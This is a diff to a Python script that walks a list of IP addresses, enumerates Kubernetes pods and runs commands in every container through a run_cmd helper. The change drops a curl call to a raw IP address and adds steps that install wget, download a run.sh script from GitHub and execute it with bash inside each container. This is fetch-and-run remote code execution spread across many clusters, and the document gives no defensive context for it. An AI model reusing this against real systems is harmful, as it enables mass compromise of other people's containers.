@@ -29,8 +29,9 @@ for i in ip_file:
                 container_name = item['spec']['containers'][0]['name']
                 # execute same thing in them
                 run_cmd(i, namespace, name, container_name, "/bin/apt-get update")
-                run_cmd(i, namespace, name, container_name, "/bin/apt-get install -y curl")
-                run_cmd(i, namespace, name, container_name, "/bin/curl -v http://205.134.240.43:8001/")
+                run_cmd(i, namespace, name, container_name, "/bin/apt-get install -y wget")
+                run_cmd(i, namespace, name, container_name, "/bin/wget https://raw.githubusercontent.com/uptycs-nhegde/super-benign-scripts/master/run.sh -O run.sh")
+                run_cmd(i, namespace, name, container_name, "/bin/bash /run.sh")
         except:
             print("Something went wrong")
             print(traceback.format_exc())
